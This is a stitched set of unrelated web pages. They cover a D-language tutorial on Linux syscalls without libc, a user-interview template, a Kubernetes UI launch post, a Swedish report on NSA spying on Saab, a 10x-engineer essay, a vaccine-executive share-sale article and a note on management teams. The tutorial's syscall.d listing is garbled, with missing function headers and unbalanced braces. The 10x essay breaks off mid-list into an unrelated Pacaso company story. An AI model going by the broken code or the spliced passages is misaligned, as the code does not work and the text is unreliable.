<p>Now we are running into the limits of what we can do with linking to the C standard library without switching to musl.  And even there we are getting away from programming in D and instead just messing with optimizing C code, which is not the point of this article.</p>



<p>So how does the C standard library print a string to standard output?  In the end it performs a system call.  In modern Windows Microsoft makes it unreasonably hard to do this by changing the syscall numbers on every update.  This might stop some viruses that hardcode system calls, but makes it impossible to do any Windows programming without using the C standard library/Win32 API. So in this article we will focus on Linux in particular since the system call interface is explicitly blessed by the kernel developers.  FreeBSD and other Unices tend to prefer the usage of the C standard library API.  Here we will also just worry about the x86_64 architecture(being 2020, the only other architecture in major use that is widely supported by D compilers is AARCH64).</p>



<p>The system call interface for Linux is specified in the System V ABI document <a rel="noreferrer noopener" href="https://www.uclibc.org/docs/psABI-x86_64.pdf" target="_blank">here</a>. In short, you just pass the syscall number in the RAX register, and the other arguments in rdi, rsi, rdx, etc.</p>



<p>The 3 main D language compilers, DMD, GDC, and LDC, all have slightly different ways you can include assembly code inline.  Just for fun I wrote a version for each using their features.  One thing I noticed is when using the LDC version of inline assembly it mentions needing a comma separated list for the constraints. I included some spaces in the list and received an invalid asm constraint error that was ridiculously tricky to track down.</p>



<p>One other thing to note is that the main function we have been using so far is based on the fact that in the end we link to the standard C library which also has a main function that is called from another entry point, by not using the standard C library and the start files from it (which basically help the C language runtime set up some scaffolding it needs for ‘atexit’ and such (side side note, the C language does have a runtime, you just usually don’t notice it)) we no longer have an entry point.  Most things assume the entry point is called ‘_start’, but this can be overridden in the linker. </p>



<p>Let’s write our syscall routines in a file called syscall.d:</p>


<pre title="">module syscall;
version (LDC)
{
    import ldc.llvmasm;
}

version (Posix)
{
extern (C):

            }
            return ret;
        }

            pragma(LDC_allow_inline);
            return __asm!long("syscall", "={rax},{rax},{rdi}
        ~{rcx},~{r11}", number, a1);
        }
    }

                mov RSI, a2[RBP];
                mov RDX, a3[RBP];
                syscall;
                mov ret, RAX;
            }
            return ret;
        }
        version (GNU)
        {
            long ret;
            asm @system @nogc nothrow
            {
                "syscall" : "=a"(ret) : "a"(number), "D"(a1), "S"(a2), "d"(a3) : "rcx", "r11";
            }
            return ret;
        }
        version (LDC)
        {
            pragma(LDC_allow_inline);
            return __asm!long("syscall",
                    "={rax},{rax},{rdi},{rsi},{rdx},~{rcx},~{r11}", number, a1, a2, a3);
        }
    }



}

</pre>


<pre><code>And our _start entry point and some helper functions in hello.d:</code></pre>


<pre title="">import syscall;

immutable long SYS_WRITE = 1;
immutable long SYS_EXIT = 60;

extern (C):
@nogc:
nothrow:
pragma(inline, true):
size_t write(int fd, in char* buf, size_t count)
{
    return syscall3(SYS_WRITE, fd, cast(long) buf, count);
}

extern (C):
@nogc:
nothrow:
pragma(inline, true):
void exit(long exit_code){
     syscall1(SYS_EXIT, exit_code);
}

extern (C):
@nogc:
nothrow:
void _start()
{
    write(1, "Hello\n", 6);
    exit(0);
}
</pre>


<p>We also need to link this file ourselves so that we don’t pull in any libc dependencies, we do this by using the ‘ld’ command and by just compiling and not linking (the ‘-c’ flag).</p>



<pre><code>gdc -fno-druntime -nodefaultlibs hello.d syscall.d -c 
ld ./hello.o
ldd ./a.out
         not a dynamic executable</code></pre>



<p>Cool so we now have a statically linked executable that has no dependence on the standard C library! How much did we save?</p>



<pre><code>wc -c ./a.out
 13672 ./a.out</code></pre>



<p>Ugh all that work and only 2k extra savings!  Lets see what is in the executable. We can get this by running ‘readelf -a’ on the executable. Our executable has 9 sections.</p>



<pre><code>[0]
[1] .text
[2] .rodata
[3] .eh_frame
[4] .data
[5] .comment
[6] .symtab
[7] .strtab
[8] .shstrtab</code></pre>



<p>The first that sticks out is the ‘.eh_frame’ section.  That is used for exception unwinding, stack cleanup and other assorted things we don’t need.  We can tell gdc that we don’t want those by adding two flags:</p>



<pre><code>&gt;gdc -fno-druntime -nodefaultlibs  -fno-exceptions -fno-asynchronous-unwind-tables  hello.d syscall.d -c 
&gt;ld ./hello.o
&gt;wc -c ./a.out
 9488 ./a.out</code></pre>



<p>Awesome we just saved 4k, but there is still fat to trim.  One thing we can learn from reading the info pages for ‘ld’ is that there is a flag to help pack executables if you don’t need shared libraries, ‘-n’. Using this saves us about 3k:</p>



<pre><code>&gt;gdc -fno-druntime -nodefaultlibs  -fno-exceptions -fno-asynchronous-unwind-tables  hello.d syscall.d -c 
&gt;ld -n ./hello.o
&gt;wc -c ./a.out
 6112 ./a.out</code></pre>



<p>If we look at the executable with readelf again we can see that the compiler outputs symbols for a lot of things we don’t need:</p>



<p>Symbol table ‘.symtab’ contains 21 entries:<br>Num: Value Size Type Bind Vis Ndx Name<br>0: 0000000000000000 0 NOTYPE LOCAL DEFAULT UND<br>1: 00000000004000b0 0 SECTION LOCAL DEFAULT 1<br>2: 00000000004002cf 0 SECTION LOCAL DEFAULT 2<br>3: 00000000004012d8 0 SECTION LOCAL DEFAULT 3<br>4: 0000000000000000 0 SECTION LOCAL DEFAULT 4<br>5: 0000000000000000 0 FILE LOCAL DEFAULT ABS test.d<br>6: 0000000000400187 32 FUNC GLOBAL DEFAULT 1 syscall0<br>7: 00000000004012e0 8 OBJECT GLOBAL DEFAULT 3 _D4test8SYS_EXITyl<br>8: 000000000040021d 83 FUNC GLOBAL DEFAULT 1 syscall5<br>9: 00000000004012d8 8 OBJECT GLOBAL DEFAULT 3 _D4test9SYS_WRITEyl<br>10: 00000000004001a7 51 FUNC GLOBAL DEFAULT 1 syscall2<br>11: 00000000004000b0 47 FUNC GLOBAL DEFAULT 1 write<br>12: 0000000000400162 37 FUNC GLOBAL DEFAULT 1 _start<br>13: 00000000004012e8 0 NOTYPE GLOBAL DEFAULT 3 __bss_start<br>14: 00000000004001da 67 FUNC GLOBAL DEFAULT 1 syscall4<br>15: 0000000000400137 43 FUNC GLOBAL DEFAULT 1 syscall1<br>16: 00000000004012e8 0 NOTYPE GLOBAL DEFAULT 3 _edata<br>17: …</p></div></article></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>Use this template to ask the user interview questions that drive product and marketing decisions. </p><div><div><p><strong>Who this is for:</strong> Founders, product managers, and UX researchers conducting user research to guide the development of new or improved products.</p>
<p><strong>Why this exists:</strong> Too frequently I see founders and product managers start with a solution and then ask for feedback on it (UX researchers tend to get this right). This doesn’t work. As one user interviewee told me recently, “When I first conducted user interviews all I learned was that everyone loves your product if you ask stupid questions”. </p>

<h2>How I Use The Template For User Interviews</h2>
<p>Here’s how I break up a 30-minute user interview:</p>
<p><strong>1. Background and rapport-building [5 minutes]</strong></p>
<p>A successful qualitative user interview should be sincere, vivid, and emotional. To achieve all three of these you need to build a solid foundation with your interviewee. When I'm on the other end of user interviews, I can always tell how experienced the interviewer is by how much they ask about me at the beginning. Experts spend more time getting to know me. We do this to build rapport and understand more about the segment we’re interviewing. For example, in my research, I’ve found that the role of a product manager varies so much between a large and small firms that they’re two completely different segments. Another thing I try to do is earn confidence from the interviewee by proving that I’m well prepared. For example, if I see that the user recently switched roles, or we have a shared connection or interest, I’ll sneak that into this portion.</p>
<p>Don’t ask: Nothing. Don't skip this part. You’re about walk the tightrope between interrogation and interview; if you don’t build rapport early on, you’ll plummet into interrogation territory.</p>
<p>Do ask: Can you tell me a little about your role as a Product Manager at Acme Group?</p>
<p><strong>2. Detailed story-collecting questions [20 minutes] </strong></p>
<p>A successful user interview is one where you, as the interviewer, walk away with a collection of vivid stories. As humans, we don’t recognize issues until we talk about specific scenarios and we tend to be terrible at predicting how we will respond to future scenarios. The key to parseing these out is the follow-up questions you ask. One rule of thumb I use is the rule of five whys; try following up a user’s response with “why” until you’ve reached the core of a problem. </p>
<p>Don’t ask: What problems do you encounter when you do x?</p>
<p>Do ask: Tell me about the last time you did x.</p>
<p><strong>3. Product questions [3 minutes]</strong></p>
<p>Once I’ve collected some stories, if I have time, I’ll spend a few minutes describing the hypothesized product and asking questions about it. One of the best things you can do here is to parse out the expectations from the customer; that’s where the gold is. For example, I’ll give a somewhat vague description of the product, and the customer will say, “so does the thing do y”? Which is the perfect time to ask, “would you like it to do y? Why?” Another great question is, “what did you expect?” For example, a user sent me the following email the other day, “I signed up but I’m not quite sure if I was doing it correctly?” My response: “May I ask a question? What did you expect to see that you didn’t?” Turns out, the user expected to see a note that they would get notified when they got a match. During this portion, I'll usually ask questions on a one to ten scale because it forces the customer to examine why they gave a certain rating to something and parses out their hesitations to use the product. </p>
<p>Don’t ask: The product does x, would you use it?</p>
<p>Do ask: On a scale of 1 (not likely at all) to 10 (very likely) how likely would you be to use the product? Why? On a scale of 1 (not likely at all) to 10 (very likely), how likely would you be to use the product if it did x? Why?</p>
<p><strong>4. Flywheel-building questions [2 minutes]</strong></p>
<p>By now you’ve built rapport, have some user stories, and the user has a sense of what you’re working on. My favorite questions to ask here are: is there anything I haven’t asked that you think I should be asking? And: do you have any other concerns that we haven’t already talked about? On average, two out of eight respondents will have a question here; when they do it is usually gold because it uncovers something huge that I’ve neglected. Finally, I ask if there’s anyone else that I should be interviewing. This question helps open our blinders to new segments and sometimes leads to a referral for the next user interview.</p>
<p>Don’t ask: Anything else?</p>
<p>Do ask: Is there anything I haven’t asked that I should be asking? Do you have any concerns that haven’t been brought up yet? Is there anyone else that you think I should be interviewing for this research?</p>
<p>For more information on this topic, I discuss how to conduct a user interview in the blog post, <a href="https://www.userinterviewexchange.com/blog/how-to-conduct-qualitative-user-interviews">How To Conduct Qualitative User Interviews For Customer Discovery</a>.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <p>If you’ve ever seen a Kubernetes demo, it probably involved a terminal and someone typing commands using kubectl and arcane yaml configuration files. This might be a powerful workflow for experts, but in an age when everything has a slick web interface, it is not the most accessible user experience. It <strong>steepens the learning curve</strong> for those new to Kubernetes, and <strong>presents a barrier</strong> to occasional users.</p>
<p>Of course, there are several graphical user interfaces available for Kubernetes, including the <em>Kubernetes Dashboard</em> project that is part of upstream Kubernetes itself. However, when we researched the landscape, we couldn’t find a solution that covered everything we were looking for. Specifically, our criteria were:</p>
<ul>
<li>100% open source</li>
<li>Actively maintained</li>
<li>Generic, in the sense of not being tied to a specific vendor’s Kubernetes distro</li>
<li>Modular and extensible</li>
<li>Clean, modern user interface</li>
<li>Implemented using a stack that was familiar to our development team (Go, Javascript/Typescript, React)</li>
<li>An interactive UI that allows read-write operations, not just a read-only dashboard</li>
<li>Multi-cluster.</li>
</ul>
<p>Despite the good number of alternatives, the reality is that none of the solutions we tested at the time really matched all the points in our criteria or was a good base to start from. So, in the time-honored tradition, we decided to build one ourselves…</p>

<p>Today, I am <strong>proud to announce the general availability of a new UI for Kubernetes</strong>: <a href="https://github.com/kinvolk/headlamp">Headlamp</a>.</p>
<p><img src="https://kinvolk.io/media/headlamp_cluster_overview.png" alt="Headlamp"></p>
<p>Headlamp is a generic and extensible Kubernetes UI that meets the criteria mentioned above. Of course, coming from Kinvolk, it is 100% open source. We hope many Kubernetes community members will not just enjoy using Headlamp, but also contribute back to the project.</p>
<p>Let’s take a quick spin through some of its core features.</p>
<h2 id="extensible-ui">Extensible UI</h2>
<p>We want Headlamp to be used for as many different use-cases as possible. That includes not only novice Kubernetes users, but also experienced operators, as well as Kubernetes vendors with very different needs. Often, particularly for UI projects, such a breadth of use cases can only be addressed by downstream users maintaining their own fork. But keeping forks up to date becomes more challenging the deeper the changes are.</p>
<p>A solution to this problem is to have a plugin system. So Headlamp supports out-of-tree UI plugins: Javascript files that are loaded by Headlamp’s backend and passed to the client which dynamically loads them.</p>
<p>This opens up Headlamp to innovation, <strong>fostering a wealth of new functionality</strong>. For example, if you want to add a button to the Pod details view that will redirect the user to a service showing how much the Pod is costing to operate, that should be easy to implement.</p>
<p>We see Headlamp’s plug-in capabilities as a great opportunity for the community. We are eager to collaborate with others who want to develop new Headlamp plugins, or enhance the plugin system itself to support other use-cases.</p>
<h3 id="traceloop">Traceloop</h3>
<p>As an <strong>example of the power of the plug-in system</strong>, and an incredibly useful tool in its own right, we have developed a <a href="https://github.com/kinvolk/lokomotive-web-ui/tree/master/plugins/ig-traces">Headlamp plugin for the traceloop gadget</a> of our <a href="https://github.com/kinvolk/inspektor-gadget">Inspektor Gadget</a> project.</p>
<p>When Inspektor Gadget is installed in a cluster and the traceloop gadget is enabled, it <strong>records all syscalls from a pod</strong> into a ring buffer. This buffer can be seen in real-time as the pod is running, allowing a lens into what the pod is doing right now, but is also saved for terminated pods. This allows operators to see what caused a crash, after it happens – like a “flight data recorder” for your Kubernetes apps.</p>
<p><img src="https://kinvolk.io/media/traces.gif" alt="Traces plugin for Headlamp"></p>
<h2 id="role-aware-ui">Role-aware UI</h2>
<p>One problem with many read-write (CRUD) user interfaces is that they are not aware of underlying access controls. For example, displaying the update/delete buttons is misleading if the user has actually no permissions to modify the resource. So Headlamp checks Kubernetes RBAC settings and displays only those controls whose actions can be performed. So, if the user does not have permission to edit a resource, the edit button will not be displayed.</p>
<p>This results in a much better UX, because it is obvious to the operator what actions are available based on their permissions at the time. In particular, this is great for situations where time-limited credentials are granted to operators (e.g. temporary deletion permissions on a resource).</p>
<p><img src="https://kinvolk.io/media/headlamp_permissions.png" alt="Pod when the user has update/delete permissions" title="Pod when the user has update/delete permissions">
<sub>Pod when the user has update/delete permissions</sub></p>
<p><img src="https://kinvolk.io/media/headlamp_no_permissions.png" alt="Pod when the user has no update/delete permissions" title="Pod when the user has no update/delete permissions">
<sub>Pod when the user has no update/delete permissions</sub></p>
<h2 id="design--user-interface">Design / User Interface</h2>
<p>We wanted Headlamp’s design to be as <strong>clean and modern</strong> as possible, yet without breaking with a more “traditional” Kubernetes UI or dashboard style. For example, we think that showing a familiar table-based view is very helpful, and we hope other visualizations, such as a graph-based representation of the cluster, can be implemented through plugins.</p>
<p>To implement Headlamp’s frontend, we chose to use React with the <a href="https://material-ui.com/">Material UI</a> library, because it is modern, clean, and is well maintained with a large user community. It also has the advantage that it is the same technology stack that we use in our <a href="https://github.com/kinvolk/nebraska">Nebraska</a> project, enabling sharing of expertise and resources, and supporting a consistent UI across all our products.</p>
<h2 id="desktop-vs-in-cluster">Desktop vs In-cluster</h2>
<p>Most Kubernetes UIs can be categorized as either a hosted (often in-cluster) backend, such as the original Kubernetes Dashboard, or a local desktop application, such as VMware’s <a href="https://github.com/vmware-tanzu/octant">Octant</a> project.</p>
<p>Both approaches have their advantages and disadvantages. For example, when run as a hosted application, it’s very simple to just share a URL with users, and have them log in through OIDC. It’s available “everywhere”, and it’s easy to keep it up-to-date with the cluster version. Conversely, with a desktop application, there’s no need to host the UI application, keeping things more isolated, but the burden of keeping the app up to date falls on the user.</p>
<p>With Headlamp, you <strong>don’t have to choose</strong> between these two approaches, as we support both. It can be easily <strong>hosted in-cluster</strong> by using/adapting the YAML files we provide, or <strong>installed locally</strong> on Linux, Mac, and Windows.</p>
<h2 id="multi-cluster-support">Multi-cluster support</h2>
<p>Most Kubernetes deployments involve multiple clusters, even if that’s just to separate a development from a production environment. Thus, Headlamp <strong>allows you to access all your clusters</strong> - with the exact method depending on whether you’re running as a hosted, or a local (desktop), application.</p>
<p>When run locally, Headlamp will read the kube config and display the contexts available there, allowing the user to change when needed just by setting the local environment variable to the appropriate cluster.</p>
<p>The way the multi-cluster support works is straightforward: it creates a proxy for each configured cluster, and redirects requests from the UI (with the Kubernetes API calls) to the right cluster address. Shout-out here to the <a href="https://github.com/indeedeng/k8dash">K8dash</a> project, whose request/API management modules we reused in the development of Headlamp.</p>
<p>It’s also possible to mix this with running in-cluster, though this does require the cluster running the application to have API access to the other configured clusters.</p>
<p><img src="https://kinvolk.io/media/headlamp_cluster_chooser.png" alt="Cluster Chooser" title="Cluster chooser dialog"></p>

<p>You may be aware that Kinvolk also has a Kubernetes distribution, <a href="https://kinvolk.io/lokomotive">Lokomotive</a>. While Headlamp is of course used within Lokomotive as the basis for its web user interface, it is important to note that these are separate and independent projects. True to our goal of being independent of any particular distro, <strong>Headlamp is designed to support any conformant Kubernetes cluster</strong>.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Bland målen för amerikanska NSA:s avlyssning fanns Saab och den danska försvarskoncernen Terma. Enligt uppgifter till DR, från flera av varandra oberoende källor med insyn i granskningen av den pågående avlyssningsskandalen i Danmark, har NSA fått tillgång till fiberoptiska kablar och ett datacenter på Amager söder om Köpenhamn. Därifrån har man avlyssnat holländsk, norsk, fransk och tysk datatrafik, danska politiska institutioner och svenska försvarsintressen.</p><p>Flera källor pekar ut det svenska Gripen-programmet som ett av målen.</p><h4>Danmark upphandlade nya stridsflyg</h4><p>Det amerikanska spionaget ska, enligt Danmarks radios källor, ha skett samtidigt som den danska staten upphandlade nya stridsflygplan – där Saabs Gripen-plan var med i slutstriden. Danska staten köpte till sist 27 amerikanska F-35-stridsflygplan.</p><p>Danmarks radio har vare sig kunnat styrka eller avfärda att avlyssningen hade ett samband med mångmiljardaffären, detsamma gäller frågan huruvida någon känslig information har röjts. Men enligt experter som SVT och DR talat med kan det röra sig om ekonomiska motiv.</p><h4>Visselblåsare slog larm</h4><p>Den danska skandalen inleddes med att en anställd på FE upptäckte att NSA bedrev olagligt spioneri genom det dansk-amerikanska underrättelsesamarbetet. Efter flera misslyckade försök att uppmärksamma FE:s ledning på problematiken larmade visselblåsaren FE:s tillsynsmyndighet TET.</p><p><span>Myndigheten inledde en undersökning som resulterade i en fyra pärmar tjock rapport. </span><br><span>Materialet från visselblåsaren indikerar, enligt tillsynsmyndigheten TET:s pressmeddelande, att FE:s ledning ”underlåtit att följa upp eller närmare undersöka indikationer på spionage”. Den danska försvarsministern Trine Bramsen tvingade fem personer i FE:s ledning att lämna sina uppdrag.</span></p><h4>Sofistikerad programvara</h4><p>NSA hade fått tillgång till internationella fiberkablar som löper in och ut ur Danmark till bland annat Sverige, USA, England och Tyskland. Kablarna är nyckel i den storskaliga avlyssning som USA och deras allierade bedriver.</p><p>Enligt Danmarks radio har NSA på danska Amager under perioden 2012-2014 upprättat ett datacenter som använder systemet XKeyscore, avslöjat 2013 av Edward Snowden, en central funktion i hela NSA:s avlyssningsapparat. Programmet gör det möjligt att gå igenom stora datamängder i fiberkablar med hjälp av ”selektorer” – sökord som namn på personer i central ställning i intressanta organisationer.</p><p>Enligt källorna fanns selektorer direkt riktade mot Gripenprogrammet och andra försvarsindustriella objekt.</p><p>SVT har i flera omgångar varit i kontakt med Saab som vid ett första möte menade att spionaget inte var anmärkningsvärt och var då beredda att ställa upp på en intervju. Senare ändrade man sig med hänvisning till att man ansåg att uppgifterna kunde misstänkas vara en desinformationskampanj från främmande makt.</p><p>SVT har också varit i kontakt med den amerikanska underrättelsetjänsten NSA som väljer att inte kommentera uppgifterna.</p><p>SVT Nyheter har sökt försvarsminister Peter Hultqvist som avböjer att kommentera uppgifterna.</p><p><em>Vet du mer?

Programmet avslöjades för första gången i samband med Edward Snowden-affären och beskrivs som ett av världens mest sofistikerade övervakningssystem.</p><p>Genom en mycket omfattande datainsamling via bland annat kabelnätverk ger det NSA och deras partners möjlighet att övervaka och söka i information rörandes miljontals människor över hela världen.</p><p>Visselblåsaren Edward Snowden har själv arbetat med XKeyscore. I ett uttalande till The Guardian beskrev han programvaran så här:</p><p>”Jag, sittande vid mitt skrivbord kan avlyssna vem som helst, du eller din revisor, en domare eller till och med presidenten, bara jag har en personlig e-post”.</p><p>NSA:s egen hemliga träningsmanual beskriver hur operatörerna kan få tillgång till NSA:s enorma datalager och söka i vad NSA själva kallar det mest vittomspännande datatrålande system man har tillgång till. En NSA-presentation deklarerar att systemet täcker ”nästan allt en typisk användare gör på internet”.</p><p>Med hjälp av ”selektorer” har underrättelsetjänsterna sökt efter sina mål, däribland Saab.</p><p>Det kan röra sig om en e-postadress, ett telefonnummer eller en telefons id-nummer.</p><p>SVT har som ett av få mediebolag i världen haft mycket god tillgång till <a href="https://www.svt.se/nyheter/granskning/ug/referens/ug-referens-snowden-dokumenten-och-sverige">Snowdens läckta</a> material och presenterade det i december 2013. I materialet framgick att FRA liksom FE samarbetar med NSA som har personal och utrustning på plats även i Stockholm, bland annat Xkeyscore. Avslöjandet beskrev också hur NSA och FRA samarbetade med den kombination av spaning som utgör systemets storhet: Xkeyscore kartlade användares nättrafik, bland tekniker på belgiska teleoperatören Belgacom, och med hjälp av trojan-systemet Quantum inserts, där FRA var en viktig partner, sköt in trojaner för att få kontroll över Belgacoms system. Ett system som bland annat betjänar EU-kommissionen.</p><p><em><a href="https://www.svtplay.se/video/29111154/nyheter-direkt/stort-forsvarsavslojande?start=auto">Här kan du se hela direktsändningen på SVT Play. </a></em></p></div></section><section><a href="https://www.svt.se/nyheter/inrikes/kallor-till-dr-usa-bedrev-spionage-mot-saab-med-hjalp-av-danska-underattelsetjansten" role="button"></a><div><p>Vet du mer?

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Growing up, the only thing that put me off while learning software development, was the common occurrence of people who cared more about one upping others with their trivia knowledge rather than actually building things.</p>
<p>At the start of my career I had a difficult time differentiating between them and actual top performers because the industry still thought there was a strong correlation between jerks and highly productive people. Employers used to be afraid something will go wrong if they fired a mythical 10x engineer and no one else understood how to fix their systems.</p>
<p>After 15 years what I've learned is that engineers that produce orders of magnitude more than others exist<sup id="fnref-1"><a href="#fn-1">1</a></sup>, but the way they are talked about is overly exaggerated. They’re usually not jerks either, at least not more than the rest of the population.</p>
<p>If you find a project where only one person know what is going on, chances are that person is not good at writing code for humans, not that is a coding god.</p>
<p>One thing we don’t often consider is that you don’t have to hire the very top of the field to find people that are orders better than the industry average. Even more important than finding great engineers is to avoid bad ones<sup id="fnref-2"><a href="#fn-2">2</a></sup>.</p>
<p>Being obsessed with finding a 10x engineer, is to be obsessed with shortcuts and Hail Marys. It will hurt you in the long run if you’re focusing on that instead of building solid fundamentals.</p>
<p>Ultimately I am convinced that focusing on building teams is more important than finding individual outliers. Of course the John Carmacks, the Jeff Deans, the Fabrice Bellards, of the industry exist, but your startup isn’t going to die if you don’t find one. It will die if you don’t build a good team.</p>
<h2>Good reads on individual and team performance</h2>
<ul>
<li>Steve McConnell, has a great summary of existing studies that support the 10x theory in <a href="https://www.construx.com/blog/productivity-variations-among-software-developers-and-teams-the-origin-of-10x/">“Individual Productivity Variation in Software Development”</a>. </li>
<li>McConnell also recognizes the aforementioned studies are not perfect in <a href="https://www.construx.com/blog/the-origins-of-10x-how-valid-is-the-underlying-research/">“Origins of 10X – How Valid is the Underlying Research?”</a>. But the lack of studies contradicting the current findings and the abundance of anecdotal stories signals towards confirmation.</li>
<li>In <a href="https://doi.org/10.1080/10429247.2002.11415178">“Leadership, Team Building, and Team Member Characteristics in High Performance Project Teams”</a> the authors identify 9 themes<sup id="fnref-3"><a href="#fn-3">3</a></sup> as potential predictors of team performance.</li>
<li>In <a href="https://doi.org/10.1080/10429247.2002.11415147">“Linking Project Team Performance with Team Health”</a> the authors emphasize that team building is a long term strategy that does not happen overnight by itself. Organizations must invest if they want to build healthy, high performing teams.</li>
<li>In <a href="https://doi.org/10.1080/10429247.1999.11415013">“An Empirical Study of the Relationship Between Team Performance and Team Maturity”</a> the authors measure the impact of changes in team dynamics, and make a correlation of team maturity with high performance teams. They mention how persistance is required to move to higher performance.</li>
<li>In <a href="https://doi.org/10.1080/10429247.1990.11414554">“Innovative Performance in Research, Development, and Engineering”</a> the authors identify 12 factors<sup id="fnref-4"><a href="#fn-4">4</a></sup> that strongly influence innovative work environments:</li>

The pair had hit it off when Rascoff’s Zillow acquired Allison’s dotloop, an online platform to manage real estate transactions. They began brainstorming ideas for startups that would combine their shared passions for real estate, travel and tech innovation.&nbsp;</p><p>They gravitated toward the concept of making second home ownership more achievable for more people, of helping people reduce waste by not buying more home than they’ll use, and enabling true ownership with far fewer hassles than traditional buying options.&nbsp;</p><p>Their plan was to launch Pacaso in a handful of destination markets with a website full of robust listings in each market, then expand over time.</p><p>Then came Covid-19. Its emergence shifted those business plans and quickly revealed how much home meant to people.</p><p>Pacaso’s leadership team pivoted, based on new behaviors, needs and preferences of people across the country. People were less inclined to fly to a second home a few times a year. Instead, they were driving an hour or two from home for relaxing weekends and remote-work weekdays at homes.&nbsp;</p><p>Inventory in second home markets, large and small, has quickly become even more constrained as demand has increased, leaving many would-be buyers priced out.&nbsp;</p><p>So instead of simply tapping homes in traditional second home markets, the plan shifted to “Pacaso everywhere.” The idea is simple: Instead of simply sourcing listings and guessing which places would resonate, we would ask people within an easy drive of major metro areas which homes we should turn into a Pacaso.&nbsp;</p><p>If people see a for-sale home they love, we’ll help them buy the amount that’s right for them by creating a property-specific LLC with a maximum of eight owners. Those co-owners enjoy their fully managed Pacaso because we take care of scheduling and maintenance. Plus, many buyers can afford a home at a higher price tier than they could buy as a whole home.&nbsp;</p><p>So that’s how we came to be. But you may be wondering about where we came up with the name Pacaso. Sounds a lot like a pretty famous artist, right? That’s not a coincidence.&nbsp;</p><p>We are inspired by Pablo Picasso’s revolutionary thinking, the way he challenged norms in early 20th century art. He is credited with co-creating Cubism, which brings together individual elements to create a new and innovative whole. That resonated with how we’re approaching second home ownership. We decided on Pacaso to honor Picasso's legacy of innovation.</p></article></section></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <p>NEW YORK -- 
	Pfizer, Moderna, Novavax: executives at several American laboratories developing COVID-19 vaccines have recently pocketed millions of dollars by selling shares in their companies -- raising questions about the propriety of such a move in the midst of a global health crisis.</p>
<p>
	On the very day that pharmaceutical giant Pfizer announced preliminary data showing its vaccine was 90 per cent effective against the coronavirus, its chief executive Albert Bourla sold shares worth US$5.6 million.</p>
<p>
	There was nothing illegal about this, Pfizer said: the sale took place according to rules allowing company heads to sell shares under predetermined criteria, at a date or for a price set in advance, to avoid any suspicion of insider training.</p>
<p>
	Under the same rules, several Moderna officials have sold shares worth more than $100 million in recent months.</p>
<ul>
	<li>
		<strong><a href="https://www.ctvnews.ca/newsletters/the-covid19-brief-newsletter-signup" target="_blank">Newsletter sign-up: Get The COVID-19 Brief sent to your inbox</a></strong></li>
</ul>
<p>
	That company has not placed a single product on the market since its creation in 2010, but the federal government has committed to paying it up to $2.5 billion if its vaccine proves effective.</p>
<p>
	Moderna shares have soared from $19 at the beginning of the year to a current level of $90.</p>
<p>
	The boss of Novavax, for his part, sold $4.2 million in shares on August 18, just over a month after the announcement it would receive public financing of $1.6 billion.</p>
<p>
	Accountable US, a nonpartisan taxpayers' advocacy group, has calculated that from the start of the federally coordinated effort to develop vaccines on May 15 until Aug. 31, officials at five pharmaceutical companies made more than $145 million by selling shares.</p>
<h3>
	'LEGALLY QUESTIONABLE'</h3>
<p>
	Executives at Pfizer and Moderna were operating under a rule put in place by the Securities and Exchange Commission in 2000 to allow company employees to sell shares without facing insider-trading charges.</p>
<p>
	It allows them to set up a plan determining the trades of their shares at a price, amount or dates specified in advance, but only when they are not in possession of privileged information that could affect share prices.</p>
<p>
	Once such a sale is planned, it cannot be modified at the last minute, even if its timing might ultimately raise questions.</p>
<p>
	Still, this use of the rule by Pfizer and Moderna appears "legally questionable," according to Daniel Taylor, an associate professor at the University of Pennsylvania's Wharton business school, who has been studying the big pharma firms since the beginning of the pandemic.</p>
<p>
	"The question is, what did the executives know at the time that they pre-scheduled the trade?" he asked.</p>
<p>
	Bourla, according to Pfizer, had merely re-authorized on Aug. 19 a plan for a share sale originally authorized in February, "with the same price and volume terms."</p>
<p>
	But a day after that, the company issued a statement describing the preliminary results of its clinical trials as "positive."</p>
<h3>
	'LEVEL PLAYING FIELD'</h3>
<p>
	It is of course not just normal but desirable that laboratory heads should be encouraged to develop a safe and reliable vaccine as quickly as possible, Taylor said.</p>
<p>
	But "when they are going to sell their shares, they have to make sure that they are operating by the same level playing field, that they're not taking advantage of other investors by having more information," he said.</p>
<p>
	Taylor added a word of caution: "I don't think that companies have internalized the reputational risk to these trades" by selling shares even as COVID-19 cases have been spiraling upward around the world.</p>
<p>
	When a top executive needs to sell shares to pay for a yacht, a new house or his children's education, the public rarely is aware of it. But with the pandemic raging, the laboratories are under intense scrutiny.</p>
<h3>
	HONESTY WITH INVESTORS</h3>
<p>
	For Sanjai Bhagat, a professor at the University of Colorado-Boulder who specializes in corporate governance, top executives should simply not be allowed to sell company shares until a year or two after they leave the company.</p>
<p>
	"If they have a lot of vested stock and stock options, then they have an incentive to get the share price as high as they can, even by not being totally honest with the investing public," he said.</p>
<p>
	Bhagat believes corporate boards should eliminate any chance of temptation.</p>
<p>
	"Not having done anything illegal is not the standard by which they should be judged," he said. "Especially in these times, people are expecting them to act responsibly."</p>
<p>
	Contacted by AFP, the SEC would not say whether it was investigating any of the lab executives.</p>
<p>
	But in an interview in May on the CNBC network, SEC chairman Jay Clayton exhorted executives to respect best practices.</p>
<p>
	"Why would you want to even raise the question that you were doing something that was inappropriate?" he asked.</p>
                                              </div></div>]]>

      <div>
        <p>Ambitious companies form management teams at every level above you,
sometimes including you. Management teams meet periodically and have
private chat rooms. They discuss customers, product and organizational
direction. Sometimes discussions are well documented and periodically
public. Sometimes decisions are poorly telegraphed out.</p>
<p>Management teams do no inherent harm in a company with customers;
employees outside of the management team can unearth customer usage
data to discover meaningful places to contribute. For example,
graphing historic server logs to discover slowest requests, figure out
why and how to fix. Or even just paying attention to the most frequent
questions sales asks and finding ways to clarify. (All of this under
the assumption that even when there is solid product direction, good
employees tend to have extra time at work and want to make good use of
it.)</p>
<p>For the first few years even in a well-funded startup with solid
founders, there are few customers. Even under a solid product team,
the product direction is not yet completely clear. The management team
includes founders and non-engineering executives. As a decision making
group they are opaque. Employees outside the management team face a
barrier in finding ways to meaningful contribute. Ambitious, dedicated
folks outside the team leave.</p>
<h3 id="so-what?">So what?</h3><p>It is not clear to me how the natural (and not inherently bad) concept
